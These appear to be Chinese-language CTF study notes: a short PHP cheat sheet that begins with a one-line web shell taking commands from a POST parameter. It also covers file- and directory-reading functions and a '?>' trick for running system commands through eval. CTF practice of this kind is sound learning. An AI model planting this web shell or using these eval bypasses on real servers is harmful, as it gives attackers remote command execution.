---
tags:
  - 实用
  - CTF
---

### 一句话木马
```php
eval($_POST["cmd"]);
```

---
### 打印调试输出
```php
// 简单输出
echo();
// 带额外信息
print_r();
var_dump();
```

---
### 读取文件
```php
highlight_file();
show_source();
```

---
### 读取目录
```php
// 扫当前目录
var_dump(glob("*"));
```

---
### 用 `?>` 代替分号 
只有末尾块的代码可以代替分号
```php
<?php
echo 1
?>          // ✅ 正确，?> 隐式补全了分号，输出 1

<?php
$a = 1;
$b = 2
?>          // ✅ 正确，等价于 $b = 2; ?>
```

可以将其传入 `eval()` ，不一定需要 `<?php`
```php
eval("system('ls')?>");
// 和 eval("system('ls');"); 一样
```

---
### 可省略括号的语言结构

| 结构                              | 说明               | 示例                                 |
| ------------------------------- | ---------------- | ---------------------------------- |
| `echo`                          | 输出一个或多个字符串（无返回值） | `echo "Hello";` / `echo("Hello");` |
| `print`                         | 输出字符串（始终返回 `1`）  | `print "Hello";`                   |
| `include` / `require`           | 引入文件（失败时行为不同）    | `include "config.php";`            |
| `include_once` / `require_once` | 仅引入一次            | `require_once "db.php";`           |
| `exit` / `die`                  | 终止脚本执行           | `exit 1;` / `die("Error");`        |
